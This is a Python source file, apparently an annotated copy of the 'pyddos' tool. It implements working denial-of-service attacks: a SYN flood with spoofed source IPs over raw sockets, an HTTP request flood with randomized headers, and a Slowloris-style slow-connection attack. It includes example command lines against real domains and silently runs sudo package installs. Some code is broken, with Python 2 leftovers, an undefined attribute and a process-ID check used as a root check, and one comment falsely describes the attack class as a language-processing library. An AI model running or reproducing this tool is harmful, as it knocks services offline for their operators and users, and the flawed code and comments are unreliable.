#!/usr/bin/env python3

version= '3.0'
title = '''

      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                                    
 DDos python script | Script used for testing ddos | Ddos attack     
 Author: ___T7hM1___                                                
 Github: http://github.com/t7hm1/pyddos                             
 Version:'''+version+''' 
'''

import re ## Expresiones regulares (regex)
import os ## Interaccion con el sistema operativo
import sys ## Manipulacion de parametros y funciones del sistema
import json ## Manejo de datos en formato JSON
import time ## Manejo de funciones relacionadas con el tiempo (pausas, reanudaciones)
import string ## Manipulacion de cadenas de texto
import signal ## Manejo de señales del sistema
import  http.client,urllib.parse ## Realizacion y uso de solicitudes HTTP
from random import * ## Generar numeros aleatorios
from socket import * ## Creacion de conexiones de red
from struct import * ## Manejo de datos binarios
from threading import * ## Creacion de hilos de ejecucion
from argparse import ArgumentParser,RawTextHelpFormatter ## Manejo de argumentos de linea de comandos

## Script de verificación de pip instalado
if os.name == 'posix':
	c = os.system('which pip')
	if c == 256:
		os.system('sudo apt-get install python-pip')
	else:
		pass
else:
	print ('[-] Check your pip installer')

try:
	import requests,colorama
	from termcolor import colored,cprint
except:
	try:
		if os.name == 'posix':
			os.system('sudo pip install colorama termcolor requests')
			sys.exit('[+] I have installed necessary modules for you')
		elif os.name == 'nt':
			os.system('pip install colorama requests termcolor')
			sys.exit('[+] I have installed nessecary modules for you')
		else:
			sys.exit('[-] Download and install necessary modules')
	except Exception as e:
		print ('[-]',e)
if os.name == 'nt':
	colorama.init()

signal.signal(signal.SIGFPE,signal.SIG_DFL)

## Final de Script

##Función que genera una dirección IP aleatoria, asegurándose de no comenzar la dirección
## con 127. Uso de "randrange" para crear cuatro octetos de la dirección IP
def fake_ip():
	while True:
		ips = [str(randrange(0,256)) for i in range(4)]
		if ips[0] == "127":
			continue
		fkip = '.'.join(ips)
		break
	return fkip

## Función que toma los argumentos de entrada y resuelve el nombre del dominio o IP objetivo.
def check_tgt(args):
	tgt = args.d
	try:
		ip = gethostbyname(tgt)
	except:
		sys.exit(cprint('[-] Can\'t resolve host:Unknown host!','red'))
	return ip

## Función que intenta abrir un archivo de nombre "ua.txt", el cual debe contener una lista
## de agentes de usuario. Si el archivo no se encuentra, devuelve una lista vacía y muestra
## un mensaje de advertencia.
def add_useragent():
	try:
		with open("./ua.txt","r") as fp:
			uagents = re.findall(r"(.+)\n",fp.read())
	except FileNotFoundError:
		cprint('[-] No file named \'ua.txt\',failed to load User-Agents','yellow')
		return []
	return uagents

## Función que devuelve una lista de URL de motores de búsqueda para usar como referencia en
## las solicitudes. 
def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
	return bots

##Constructor
class Pyslow:

	## Inicializa el objetivo (tgt), puerto (port), tiempo de espera (to), hilos (threads),
	## tiempo de suspensión (sleep)
	def __init__(self,
		        tgt,
		        port,
		        to,
		        threads,
		        sleep):
		self.tgt = tgt
		self.port = port
		self.to = to
		self.threads = threads
		self.sleep = sleep
		self.method = ['GET','POST']
		self.pkt_count = 0

	## Función que genera un paquete HTTP aleatorio usando un método (GET/POS) y un agente de
	## usuario de la lista cargada
	def mypkt(self):
		text = choice(self.method) + ' /' + str(randint(1,999999999)) + ' HTTP/1.1\r\n'+\
		      'Host:'+self.tgt+'\r\n'+\
		      'User-Agent:'+choice(add_useragent())+'\r\n'+\
		      'Content-Length: 42\r\n'
		pkt = buffer(text)
		return pkt

	## Crea un socket TCP y envía un paquete al objetivo. Tiene manejo de excepciones para
	## reconectar en caso de fallo
	def building_socket(self):
		try:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			self.pkt_count += 3
			if sock:
				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
				self.pkt_count += 1
		except Exception:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			sock.settimeout(None)
			self.pkt_count+=3
			if sock:
				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
				self.pkt_count+=1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		return sock

	## Función que envía paquetes de forma continua, inentando enviar un encabezado "X-a: b"
	def sending_packets(self):
		try:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			self.pkt_count+=3
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt+=1
		except Exception:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			sock.settimeout(None)
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt_count+=1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		return sock

	## Función que construye los sockets necesarios y envía los paquetes en un bucle,
	## controlando el número de hilos y manejando posibles interrupciones.
	def doconnection(self):
		socks = 0
		fail = 0
		lsocks=[]
		lhandlers=[]
		cprint('\t\tBuilding sockets','blue')
		while socks < (int(self.threads)):
			try:
				sock = self.building_socket()
				if sock:
					lsocks.append(sock)
					socks+=1
					if socks > int(self.threads):
						break
			except Exception:
				fail+=1
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
		cprint('\t\tSending packets','blue')
		while socks < int(self.threads):
			try:
				handler = self.sending_packets()
				if handler:
					lhandlers.append(handler)
					socks+=1
					if socks > int(self.threads):
						break
				else:
					pass
			except Exception:
				fail+=1
			except KeyboardInterrupt:
				break
				sys.exit(cprint('[-] Canceled by user','red'))
		# print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
		time.sleep(self.sleep)

## Constructor
class Requester(Thread):

    ## Función de inicialización. Determina el puerto (80 = HTTP, 443 = HTTPS)
	def __init__(self,tgt):
		Thread.__init__(self)
		self.tgt = tgt
		self.port = None
		self.ssl = False
		self.req = []
		self.lock=Lock()
		url_type = urllib.parse.urlparse(self.tgt)
		if url_type.scheme == 'https':
			self.ssl = True
			if self.ssl == True:
				self.port = 443
		else:
			self.port = 80

   ## Función que genera encabezados HTTP de forma aleatoria, seleccionando valores de 
   ## diferentes listas para crear una simulación de tráfico real.
	def header(self):
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
		bot = add_bots()
		c=choice(cachetype)
		a=choice(acceptEc)
		http_header = {
		    'User-Agent' : choice(add_useragent()),
		    'Cache-Control' : c,
		    'Accept-Encoding' : a,
		    'Keep-Alive' : '42',
		    'Host' : self.tgt,
		    'Referer' : choice(bot)
		}
		return http_header

	## Función que genera una cadena aleatoria que se utiliza en la URL de la solicitud
	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters+string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)

	## Función de creación de una URL completa, usando el objetivo y una cadena aleatoria
	def create_url(self):
		return self.tgt + '?' + self.rand_str()

	## Función que combina la URL y los encabezados en una tupla (lista ordenada), la cual 
	## se usará para realizar la solicitud
	def data(self):
		url = self.create_url()
		http_header = self.header()
		return (url,http_header)

	## Función que realiza la solicitud HTTP usando el método especificado (GET/POS) y 
	## maneja excepciones para cerrar conexiones de manera adecuada
	def run(self):
		try:
			if self.ssl:
				conn = http.client.HTTPSConnection(self.tgt,self.port)
			else:
				conn = http.client.HTTPConnection(self.tgt,self.port)
				self.req.append(conn)
			for reqter in self.req:
				(url,http_header) = self.data()
				method = choice(['get','post'])
				reqter.request(method.upper(),url,None,http_header)
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		except Exception as e:
			print (e)
		finally:
			self.closeConnections()
	## Método para cerrar la conexión		
	def closeConnections(self):
		for conn in self.req:
			try:
				conn.close()
			except:
				pass

class Synflood(Thread):
	
	## Constructor
	## Inicializa el objetivo y la dirección IP. Si no se proporciona un socket, crea uno de tipo RAW.
	def __init__(self,tgt,ip,sock=None):
		Thread.__init__(self)
		self.tgt = tgt
		self.ip = ip
		self.psh = ''
		if sock is None:
			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
			self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		else:
			self.sock=sock
		self.lock=Lock()

	## Método que calcula la suma de verificación para los paquetes TCP, asegurando que sean
	## válidos
	def checksum(self):
		s = 0 
		for i in range(0,len(self.psh),2):
			w = (ord(self.psh[i]) << 8) + (ord(self.psh[i+1]))
			s = s+w

		s = (s>>16) + (s & 0xffff)
		s = ~s & 0xffff

		return s

	## Método que construye un paquete TCP completo, incluyendo encabezados IP y TCP, 
	## utilizando valores predeterminados y la dirección IP del objetivo	
	def Building_packet(self):
		ihl=5
		version=4
		tos=0
		tot=40
		id=54321
		frag_off=0
		ttl=64
		protocol=IPPROTO_TCP
		check=10
		s_addr=inet_aton(self.ip)
		d_addr=inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

		source = 54321
		dest = 80
		seq = 0
		ack_seq = 0
		doff = 5
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(5840)
		check = 0
		urg_prt = 0

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)

		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
		self.psh = self.psh + tcp_header;

		tcp_checksum = self.checksum()

		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
		packet = ip_header + tcp_header

		return packet

	## Método que envía el paquete construido al objetivo en un bucle, manejando excepciones
	## y asegurando que el acceso a los recursos compartidos esté protegido mediante un
	## bloqueo
	def run(self):
		packet=self.Building_packet()
		try:
			self.lock.acquire()
			self.sock.sendto(packet,(self.tgt,0))
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		except Exception as e:
			cprint(e,'red')
		finally:
			self.lock.release()

	## Núcleo del script
def main():

	## Uso de 'argparse' para definir y manejar los argumentos de línea de comandos.
	parser = ArgumentParser(
        usage='./%(prog)s -t [target] -p [port] -t [number threads]',
        formatter_class=RawTextHelpFormatter,
        prog='pyddos',
        description=cprint(title,'white',attrs=['bold']),
        epilog='''
Example:
    ./%(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
    ./%(prog)s -d www.domain.com -s 100 -Request
    ./%(prog)s -d www.google.com -Synflood -T 5000 -t 10.0
'''
)
	options = parser.add_argument_group('options','')

	## Esta línea con el argumento '-d' especifica el objetivo (IP o dominio)
	options.add_argument('-d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')

	## Esta línea con el argumento '-t' establece el tiempo de espera para los distintos sockets
	options.add_argument('-t',metavar='<float>',default=5.0,help='Set timeout for socket')

	## Esta línea con el argumento '-T' define el número de hilos para la conexión
	options.add_argument('-T',metavar='<int>',default=1000,help='Set threads number for connection (default = 1000)')

	## Esta línea con el argumento '-p' especifica el puerto designado como objetivo (por defecto = 80)
	options.add_argument('-p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))

	## Esta línea con el argumento '-s' establece el tiempo de sueño (sleep) entre reconexiones
	options.add_argument('-s',metavar='<int>',default=100,help='Set sleep time for reconnection')

	## Esta línea con el argumento '-i' permite especificar una IP falsa, en caso de no tener una IP real
	options.add_argument('-i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')

	## Activación del ataque DDoS por Requests (Solicitudes)
	options.add_argument('-Request',action='store_true',help='Enable request target')

	## Activación del ataque DDoS por Inundación SYN
	options.add_argument('-Synflood',action='store_true',help='Enable synflood attack')

	## Activación del ataque DDoS por Pyslow (Slowloris(Sobrecarga de conexiones))
	options.add_argument('-Pyslow',action='store_true',help='Enable pyslow attack')

	## Creación de una IP falsa para su utilización, en caso de no tener una IP real
	options.add_argument('--fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')
	
	## Método de verificación de objetivo. En caso contrario, muestra la ayuda del script
	args = parser.parse_args()
	if args.d == False:
		parser.print_help()
		sys.exit()
	add_bots();add_useragent()
	if args.d:
		check_tgt(args)

	## Ataque SYN: Crea un socket RAW (Socket de manipulación de redes sin intervención del SO)	
	## y envía paquetes SYN en un bucle, utilizando direcciones IP falsas si no se especifica una
	if args.Synflood:
		uid = os.getpid()
		if uid == 0:
			cprint('[*] You have enough permisson to run this script','green')
			time.sleep(0.5)
		else:
			sys.exit(cprint('[-] You haven\'t enough permission to run this script','red'))
		tgt=check_tgt(args)
		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		ts=[]
		threads=[]
		print (colored('[*] Started SYN Flood: ','blue')+colored(tgt,'red'))
		while 1:
			if args.i == False:
				args.fakeip = True
				if args.fakeip == True:
					ip = fake_ip()
			else:
				ip = args.i
			try:
				for x in range(0,int(args.T)):
					thread=Synflood(tgt,ip,sock=synsock)
					thread.setDaemon(True)
					thread.start()
					thread.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))

	## Ataque Requests: Envía solicitudes HTTP al objetivo en un bucle, utilizando la clase Requester
	## Clase Requester: Librería que encapsula la lógica para realizar solicitudes HTTP a un server web
	elif args.Request:
		tgt = args.d
		threads = []
		print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
		while 1:
			try:
				for x in range(int(args.T)):
					t=Requester(tgt)
					t.daemon = True
					t.start()
					t.join()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))

	## Ataque Pyslow: Utiliza la clase Pyslow para enviar paquetes de tipo slowloris al objetivo.
	## Clase Pyslow: Librería que proporciona algoritmos de velocidad lenta para tareas de
	## procesamiento de lengueja natural como 'tokenization', 'stemming', y 'lemmatization'
	## Slowloris: Paquetes de envío lento con solicitudes HTTP parciales y mantenimiento de las
	## conexiones abiertas		
	elif args.Pyslow:
		try:
			tgt = args.d
			port = args.p
			to = float(args.t)
			st = int(args.s)
			threads = int(args.T)
		except Exception as e:
			print ('[-]',e)
		while 1:
			try:
				worker=Pyslow(tgt,port,to,threads,st)
				worker.doconnection()
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
	if not (args.Synflood) and not (args.Request) and not (args.Pyslow):
		parser.print_help()
		print
		sys.exit(cprint('[-] You must choose attack type','red'))

## Ejecución del script
if __name__ == '__main__':
	main()
